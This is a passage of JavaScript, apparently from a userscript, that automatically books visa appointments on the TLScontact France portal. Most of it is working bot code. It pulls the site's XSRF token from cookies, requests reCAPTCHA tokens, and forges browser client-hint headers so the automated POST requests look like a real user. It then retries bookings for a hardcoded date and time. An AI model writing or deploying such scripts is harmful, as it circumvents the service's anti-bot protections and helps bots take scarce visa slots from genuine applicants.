    function bookAppointment(date, time) {
        const fiAppointmentType = localStorage.getItem("fiAppointmentType" + localStorage.getItem("TLS_WEB_issuer"));
        const ref = window.location.pathname.split("/")[4];
        const center = window.location.pathname.split("/")[3];
        const country = window.location.pathname.split("/")[2];
        const fTravPurpose = localStorage.getItem("f_trav_purpose" + localStorage.getItem("TLS_WEB_issuer"));
        const cookieName = "XSRF-TOKEN";
        const cookieValue = document.cookie.split('; ').find(row => row.startsWith(cookieName)).split('=')[1];
        const errorKey = 'bookingError';
        const successKey = 'bookingSuccess';
var f_xcopy_ug_type1 = localStorage.getItem("f_xcopy_ug_type"+localStorage.getItem("TLS_WEB_issuer"));

        // Ensure a new token is generated for each request
        function getRecaptchaToken() {
            return new Promise((resolve, reject) => {
                grecaptcha.ready(function() {
                    grecaptcha.execute('6LcTpXcfAAAAAM3VojNhyV-F1z92ADJIvcSZ39Y9', { action: 'book' }).then(function(token) {
                        resolve(token);
                    }).catch(function(error) {
                        reject(error);
                    });
                });
            });
        }

        function sendBookingRequest(token) {
            const formData = {};
             // Générer les headers dynamiquement
            function getHeaders(token) {
                const uaData = navigator.userAgentData || {};
                return {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": navigator.languages ? navigator.languages.join(", ") : "fr-FR, fr;q=0.9, en-US;q=0.8, en;q=0.7",
                    "content-length": "0",
                    "content-type": "application/json",
                    "dnt": "1",
                    "origin": "https://fr.tlscontact.com",
                    "priority": "u=1, i",
                    "recaptcha-token": token,
                    "sec-ch-ua": uaData.brands
                        ? uaData.brands.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
                    "sec-ch-ua-arch": uaData.architecture || "x86",
                    "sec-ch-ua-bitness": uaData.bitness || "64",
                    "sec-ch-ua-full-version": `"${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}"`,
                    "sec-ch-ua-full-version-list": uaData.fullVersionList
                        ? uaData.fullVersionList.map(b => `"${b.brand}";v="${b.version}"`).join(", ")
                        : `"Google Chrome";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Chromium";v="${navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "131.0.6778.266"}", "Not_A Brand";v="24.0.0.0"`,
                    "sec-ch-ua-mobile": uaData.mobile ? "?1" : "?0",
                    "sec-ch-ua-platform": uaData.platform || "Windows",
                    "sec-ch-ua-platform-version": `"15.0.0"`,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": navigator.userAgent,
                    "x-xsrf-token": cookieValue
                };
            }

                let requestStartTime = performance.now();

            fetch(`https://fr.tlscontact.com/services/customerservice/api/tls/appointment/book?client=fr&issuer=${center}&formGroupId=${ref}&timeslot=${date}%20${time}&appointmentType=${fiAppointmentType}&accountType=INDI&lang=fr-fr`, {
                      method: "POST",
                    headers: getHeaders(token),
                    referrer: `https://fr.tlscontact.com/appointment/${country}/${center}/${ref}`,

            })
            .then(response => {

            let requestEndTime = performance.now();
            let requestDuration = ((requestEndTime - requestStartTime) / 1000).toFixed(3); // Convert to seconds
            console.log(`Request took: ${requestDuration} s`);
            console.log(`Page has been active for: ${getPageActiveTime()} s`);

                if (response.status === 200) {
                    return response.json().then(result => {
                        if (result.message === "book appointment success") {
                            console.log("Booking successful:", result);
                            document.getElementById("MOTIF").textContent = "Booking successful!";
                            localStorage.setItem(successKey, 'true');
                            window.open('https://example.com/success', '_blank'); // Replace with your URL
                        } else {
                            console.error("Booking failed:", result);
                            document.getElementById("MOTIF").textContent = `Booking failed: ${result.message}`;
                            localStorage.setItem(errorKey, 'true');
                        }
                    });
                } else if (response.status === 400) {
                    console.error("Request failed with status 400. Retrying...");
                    document.getElementById("MOTIF").textContent = `Request failed with status 400. Retrying...`;
                    localStorage.setItem(errorKey, 'true');
                    // Retry the booking request with a new token
                    getRecaptchaToken()
                        .then(newToken => {
                           // sendBookingRequest(newToken);
                        })
                        .catch(error => {
                            console.error("Error getting reCAPTCHA token:", error);
                            document.getElementById("MOTIF").textContent = `Error getting reCAPTCHA token: ${error.message}`;
                        });
                } else {
                    throw new Error(`Request failed with status ${response.status}`);
                }
            })
            .catch(error => {
                console.error("Error booking appointment:", error);
                document.getElementById("MOTIF").textContent = `Error booking appointment: ${error.message}`;
                localStorage.setItem(errorKey, 'true');
            });
        }

        if (!localStorage.getItem(errorKey)) {
            // Generate token and send booking request with a slight delay
            getRecaptchaToken()
                .then(token => {
                    setTimeout(() => sendBookingRequest(token), 100); // Introduce a 100ms delay
                })
                .catch(error => {
                    console.error("Error getting reCAPTCHA token:", error);
                    document.getElementById("MOTIF").textContent = `Error getting reCAPTCHA token: ${error.message}`;
                    localStorage.setItem(errorKey, 'true');
                });
        } else {
            console.log('Error exists in local storage. Skipping booking attempt.');
        }
    }

    // Ajoutez cette fonction pour le bouton
    document.getElementById("bookButton").addEventListener("click", function() {
        // Remplacez ces valeurs par les valeurs souhaitées
        const date = '2025-01-28';
        const time = '10:00';
        bookAppointment(date, time);
    });
}
}, 1000);


// Clear local storage if the URL ends with 'home'
if (window.location.pathname.split("/")[4] === 'home') {
    localStorage.removeItem('bookingError');
    localStorage.removeItem('bookingSuccess');
}
}
else {
 // setTimeout(function(){ window.location.href =  "https://blsspainvisa.com" }, 10e3);
}



  //setTimeout(function(){ window.location.href =  "https://blsspainmorocco.com/" }, 5e3);
  //setTimeout(function(){ window.location.href =  "https://www.lachainemeteo.com/meteo-france/ville-33/previsions-meteo-paris-aujourdhui" }, 5e3);
